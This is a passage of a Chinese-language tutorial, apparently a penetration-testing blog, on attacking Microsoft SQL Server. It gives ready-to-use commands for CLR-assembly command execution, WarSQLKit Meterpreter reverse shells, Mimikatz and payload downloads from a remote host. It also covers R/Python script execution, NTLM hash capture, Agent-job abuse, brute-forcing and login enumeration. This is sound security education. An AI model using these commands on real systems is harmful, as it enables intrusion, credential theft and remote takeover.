class="line">010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934</span><br><span class="line">E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E</span><br><span class="line">6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C</span><br><span class="line">5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC</span><br><span class="line">7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C446174616261736531</span><br><span class="line">5C6F626A5C44656275675C4461746162617365312E70646200000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000282C00000000000000000000422C00</span><br><span class="line">00002000000000000000000000000000000000000000000000342C0000000000000000000000005F</span><br><span class="line">436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000010010000000180000</span><br><span class="line">80000000000000000000000000000001000100000030000080000000000000000000000000000001</span><br><span class="line">000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045</span><br><span class="line">005200530049004F004E005F0049004E0046004F0000000000BD04EFFE0000010000000000000000</span><br><span class="line">0000000000000000003F000000000000000400000002000000000000000000000000000000440000</span><br><span class="line">000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061</span><br><span class="line">006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E</span><br><span class="line">006700460069006C00650049006E0066006F00000088010000010030003000300030003000340062</span><br><span class="line">00300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E</span><br><span class="line">000000000020000000300008000100460069006C006500560065007200730069006F006E00000000</span><br><span class="line">0030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E</span><br><span class="line">0061006D00650000004400610074006100620061007300650031002E0064006C006C000000280002</span><br><span class="line">0001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E</span><br><span class="line">0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000440061</span><br><span class="line">0074006100620061007300650031002E0064006C006C000000340008000100500072006F00640075</span><br><span class="line">0063007400560065007200730069006F006E00000030002E0030002E0030002E0030000000380008</span><br><span class="line">00010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E</span><br><span class="line">0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00002000000C000000543C0000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image43.png"></p><p>创建存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p><img src="/images/image44.png"></p><h3 id="利用CLR执行命令"><a href="#利用CLR执行命令" class="headerlink" title="利用CLR执行命令"></a>利用CLR执行命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami &#x2F;all&quot;;</span><br></pre></td></tr></table></figure><p><img src="/images/image45.png"></p><h4 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h4><p>WarSQLKit是一个针对MSSQL CLR进行利用的工具，有以下两个版本。</p><ul><li>WarSQLKit是完全版本，内置多种功能。</li><li>WarSQLKit是完全版本，内置多种功能。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EPICROUTERSS&#x2F;MSSQL-Fileless-Rootkit-WarSQLKit</span><br></pre></td></tr></table></figure><p>WarSQLKitMinimal是简化版，只能执行命令。</p><h3 id="导入WarSQLKit-DLL文件"><a href="#导入WarSQLKit-DLL文件" class="headerlink" title="导入WarSQLKit DLL文件"></a>导入WarSQLKit DLL文件</h3><p>利用16进制文件流方式导入WarSQLKit.dll文件。<br><img src="/images/image46.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET &#x3D; UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image47.png"><br>创建存储过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_cmdExec</span><br><span class="line">@Command [nvarchar](max)</span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image48.png"></p><h4 id="WarSQLKit-执行命令"><a href="#WarSQLKit-执行命令" class="headerlink" title="WarSQLKit 执行命令"></a>WarSQLKit 执行命令</h4><p>WarSQLKit CmdExec实现了以下功能<br>执行任意Windows命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;whoami&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image49.png"><br>以SYSTEM权限执行Windows命令<br><img src="/images/image50.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;whoami &#x2F;RunSystemPriv&#39;;</span><br></pre></td></tr></table></figure><p>以SYSTEM权限运行PowerShell命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;powershell Get-ChildItem &#x2F;RunSystemPS&#39;;</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X86 Meterpreter反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image51.png"></p><p>生成以SYSTEM权限运行的X64 Meterpreter反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X64 Meterpreter RC4反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#39;</span><br><span class="line">RC4PASSWORD&#x3D;123456</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X86 Meterpreter_bind_tcp shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_bind_tcp LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p>每次使用 Meterpreter反弹都会创建一个reverse进程<br><img src="/images/image52.png"></p><p>运行Mimikatz功能抓取密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#39;sp_Mimikatz&#39;;</span><br><span class="line">select * from WarSQLKitTemp &#x2F;&#x2F;获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/images/image53.png"><br>文件下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_downloadFile http:&#x2F;&#x2F;test.com&#x2F;Invoke--Shellcode.ps1</span><br><span class="line">C:\test\Invoke--Shellcode.ps1 300&#39;;</span><br><span class="line">EXEC sp_cmdExec &#39;sp_downloadFile http:&#x2F;&#x2F;10.251.0.33&#x2F;Invoke--Shellcode.ps1</span><br><span class="line">C:\test\Invoke--Shellcode.ps1 300&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image54.png"></p><p>获取MSSQL Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getSqlHash&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image55.png"></p><p>获取Windows Product</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getProduct&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image56.png"></p><p>获取可用的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getDatabases&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image57.png"></p><hr><h2 id="SQL-Server-R和Python的利用"><a href="#SQL-Server-R和Python的利用" class="headerlink" title="SQL Server R和Python的利用"></a>SQL Server R和Python的利用</h2><p>SQL Server 2017加入了Microsoft机器学习服务，该服务允许通过SQL Server中sp_execute_external_script 执行Python和R脚本</p><p>利用条件:</p><ul><li><p>Machine Learning Services必须要在Python安装过程中选择</p></li><li><p>必须启用外部脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;external scripts enabled&#39;, 1 RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure><ul><li>重新启动数据库服务器</li></ul></li><li><p>用户拥有执行任何外部脚本权限</p></li></ul><h3 id="R脚本利用"><a href="#R脚本利用" class="headerlink" title="R脚本利用"></a>R脚本利用</h3><p>利用R执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;external scripts enabled&#39;</span><br><span class="line">GO</span><br><span class="line">EXEC sp_execute_external_script</span><br><span class="line">@language&#x3D;N&#39;R&#39;,</span><br><span class="line">@script&#x3D;N&#39;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span><br><span class="line">&#x2F;c dir&quot;,intern&#x3D;T))&#39;</span><br><span class="line">WITH RESULT SETS (([cmd_out] text));</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>利用R抓取Net-NTLM哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@script&#x3D;N&#39;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#39;</span><br></pre></td></tr></table></figure><h3 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a>Python脚本利用</h3><p>Python ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script</span><br><span class="line">@language &#x3D;N&#39;Python&#39;,</span><br><span class="line">@script&#x3D;N&#39;import sys</span><br><span class="line">OutputDataSet &#x3D; pandas.DataFrame([sys.version])&#39;</span><br><span class="line">WITH RESULT SETS ((python_version nvarchar(max)))</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script</span><br><span class="line">@language &#x3D;N&#39;Python&#39;,</span><br><span class="line">@script&#x3D;N&#39;import subprocess</span><br><span class="line">p &#x3D; subprocess.Popen(&quot;cmd.exe &#x2F;c whoami&quot;, stdout&#x3D;subprocess.PIPE)</span><br><span class="line">OutputDataSet &#x3D; pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#39;</span><br><span class="line">WITH RESULT SETS (([cmd_out] nvarchar(max)))</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Server代理执行计划任务"><a href="#SQL-Server代理执行计划任务" class="headerlink" title="SQL Server代理执行计划任务"></a>SQL Server代理执行计划任务</h2><p>SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务。<br>首先启动SQL Server代理服务。<br><img src="/images/image58.png"></p><p>执行计划任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;test_powershell_job1&#39;;</span><br><span class="line">EXEC sp_add_jobstep @job_name &#x3D; N&#39;test_powershell_job1&#39;, @step_name &#x3D;</span><br><span class="line">N&#39;test_powershell_name1&#39;, @subsystem &#x3D; N&#39;PowerShell&#39;, @command &#x3D;</span><br><span class="line">N&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &#x2F;all &gt;c:\\123.txt&#39;, @retry_attempts &#x3D; 1,</span><br><span class="line">@retry_interval &#x3D; 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;test_powershell_job1&#39;;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image59.png"></p><hr><h1 id="攻击方实战思路分析"><a href="#攻击方实战思路分析" class="headerlink" title="攻击方实战思路分析"></a>攻击方实战思路分析</h1><p>第三章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。</p><h2 id="SQL-Server实例发现"><a href="#SQL-Server实例发现" class="headerlink" title="SQL Server实例发现"></a>SQL Server实例发现</h2><p>SQL Server的实例发现，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS<br>监听服务、UDP广播、SPN服务等方式。 常见的几种实例发现工具:</p><ul><li><p><a href="https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017">osq</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osql -L</span><br></pre></td></tr></table></figure><p><img src="/images/image60.png"></p></li><li><p><a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017">sqlcmd</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -L</span><br></pre></td></tr></table></figure><p><img src="/images/image61.png"></p></li><li><p><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块</span><br></pre></td></tr></table></figure><p><img src="/images/image62.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast &#x2F;&#x2F;SQL Server实例发现</span><br></pre></td></tr></table></figure><p><img src="/images/image63.png"></p></li><li><p><a href="http://www.sqlsecurity.com/downloads">SQLPing3</a></p></li><li><p>Metasploit mssql_ping module </p></li><li><p>Nmap</p></li><li><p>Nessus</p></li><li><p>……</p></li></ul><h3 id="本地实例发现"><a href="#本地实例发现" class="headerlink" title="本地实例发现"></a>本地实例发现</h3><p>作为本地用户，主要是通过检查系统服务和注册表设置来标识SQL Server实例。检查系统服务<br><img src="/images/image64.png"></p><p>检查注册表键值，也可判断SQL Server实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server&quot; &#x2F;v InstalledInstances</span><br></pre></td></tr></table></figure><p><img src="/images/image65.png"></p><p>使用PowerUpSQL，来识别本地实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块 Get-SQLInstanceLocal &#x2F;&#x2F;SQL Server实例发现</span><br></pre></td></tr></table></figure><p><img src="/images/image66.png"></p><h3 id="远程实例发现"><a href="#远程实例发现" class="headerlink" title="远程实例发现"></a>远程实例发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast -Verbose &#x2F;&#x2F;UDP广播Ping Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 &#x2F;&#x2F;UDP端口扫描 Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get- SQLInstanceScanUDPThreaded -Verbose &#x2F;&#x2F;从文件获取实例列表</span><br></pre></td></tr></table></figure><h3 id="域内实例发现"><a href="#域内实例发现" class="headerlink" title="域内实例发现"></a>域内实例发现</h3><p>域内实例主要利用SPN扫描发现实例，先简单介绍一下什么是SPN服务。</p><h4 id="SPN服务"><a href="#SPN服务" class="headerlink" title="SPN服务"></a>SPN服务</h4><p>Windows 域环境是基于活动目录(Active Directory)服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称(Service Principal Name, SPN)。使用Kerberos协议进行身份验证的域环境中， 本地账号SPN将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图 SQL Server服务运行在域内用户时的状态。</p><p><img src="/images/image67.png"></p><p>因为域中每台机器都要在Kerberos身份验证服务中注册SPN，所以攻击者可以向域控制器(AD)发送请求，获取SPN相关信息，得到某个服务资源在哪台服务器上。<br>SQL Server服务的SPN示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV&#x2F;MSSQL2.sec.com:1433 服务组件名称&#x2F;主机名.域名:监听端口</span><br></pre></td></tr></table></figure><p>域内用户账号下运行的服务，手动注册SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc&#x2F;MSSQL2.sec.com:1433 mssqluser</span><br></pre></td></tr></table></figure><p><img src="/images/image68.png"></p><p>更多SPN相关介绍请查看:<a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx">https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx</a></p><p>域中安装的SQL Server会使用关联的服务帐户自动在活动目录(Active Directory)中注册，以支持 Kerberos身份验证。可以使用以下方式识别实例:：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="/images/image69.png"></p><ul><li><a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx">setspn.exe</a></li><li><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">adfind.exe</a></li><li><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-Spn.psm1</a></li><li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure><p><img src="/images/image70.png"></p><p>PowerUpSQL其他发现实例命令</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>使用备用域凭据 发现Active Directory域SQL Server实例</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe import- module PowerUpSQL.psd1 Get-SQLInstanceDomain -Verbose - DomainController 192.168.1.1 -Username domain\user -password Password123</td></tr><tr><td>列出使用特定域 帐户的SQL Server实例</td><td>Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser</td></tr><tr><td>列出共享域用户 SQL Server服务 帐户</td><td>Get-SQLInstanceDomain -Verbose</td></tr></tbody></table><hr><h2 id="SQL-Server口令爆破"><a href="#SQL-Server口令爆破" class="headerlink" title="SQL Server口令爆破"></a>SQL Server口令爆破</h2><p>连接测试，两种功能均可用于测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line">Invoke-SQLAuditWeakLoginPw</span><br></pre></td></tr></table></figure><p><img src="/images/image71.png"><br>爆破必须的几个条件： </p><ul><li>常见的弱密码</li><li>当前的本地用户访问权限</li><li>当前域用户访问权限</li><li>备用域用户访问权限</li></ul><p>使用msf来执行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br></pre></td></tr></table></figure><p><img src="/images/image72.jpeg"></p><p>PowerUpSQL其他获取账户相关命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>获取可用提供的SQL Server登录名登录的域 SQL Server列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get- SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用当前域帐 户登录的域SQL服务器 的列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get- SQLConnectionTestThreaded -Verbose -Threads 10 | Where- Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用备用域帐 户登录的域SQL服务器 的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe Get- SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose - Threads 15</td></tr><tr><td>获取可以使用非域系统 中的备用域帐户登录的 域SQL服务器的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe Get- SQLInstanceDomain -Verbose -Username ‘domain\user’ -Password ‘MyPassword!’ -DomainController 10.1.1.1 | Get- SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>发现域SQL Server，并 根据实例名称确定它们 是否配置有普通应用程 序使用的默认密码。</td><td>Get-SQLInstanceDomain</td></tr></tbody></table><hr><h2 id="SQL-Server权限提升"><a href="#SQL-Server权限提升" class="headerlink" title="SQL Server权限提升"></a>SQL Server权限提升</h2><p>权限提升基本的一个思路:<br><img src="/images/image73.png"></p><p>域用户可以到处登录的前置条件。</p><ul><li>添加了域用户</li><li>已添加本地用户</li><li>特权继承</li></ul><p>获得Sysadmin权限的一些利用点：<br><img src="/images/image74.jpeg"></p><h3 id="获得低权限账号"><a href="#获得低权限账号" class="headerlink" title="获得低权限账号"></a>获得低权限账号</h3><p>可以使用常用的凭据执行爆破，但要注意帐户锁定。<br>以PowerUpSQL为例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块。</span><br><span class="line">Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw &#x2F;&#x2F;从未经身份验证的用户角度发起攻 击。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw &#x2F;&#x2F;从域用户角度开始攻击。 Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username &lt;USERNAME&gt; - Password &lt;PASSWORD&gt; &#x2F;&#x2F;手动连接到已标识的SQL Server实例。</span><br></pre></td></tr></table></figure><p>许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块。 Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw</span><br></pre></td></tr></table></figure><p>如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。</p><ul><li><a href="https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b">sqlmitm.py</a> </li></ul><h3 id="使用本地或域用户账号"><a href="#使用本地或域用户账号" class="headerlink" title="使用本地或域用户账号"></a>使用本地或域用户账号</h3><p>尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.psd1</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTest</span><br><span class="line">Get-SQLInstanceLocal | Get-SQLConnectionTest</span><br></pre></td></tr></table></figure><h3 id="从Public到Sysadmin"><a href="#从Public到Sysadmin" class="headerlink" title="从Public到Sysadmin"></a>从Public到Sysadmin</h3><p>猜测弱密码获得高权限角色账号，一般需要以下两步： </p><ul><li>枚举登录名</li><li>猜测密码</li></ul><h4 id="枚举登录名"><a href="#枚举登录名" class="headerlink" title="枚举登录名"></a>枚举登录名</h4><p>默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.syslogins</span><br></pre></td></tr></table></figure><p><img src="/images/image75.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.server_principals</span><br></pre></td></tr></table></figure><p><img src="/images/image76.png"></p><p>suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 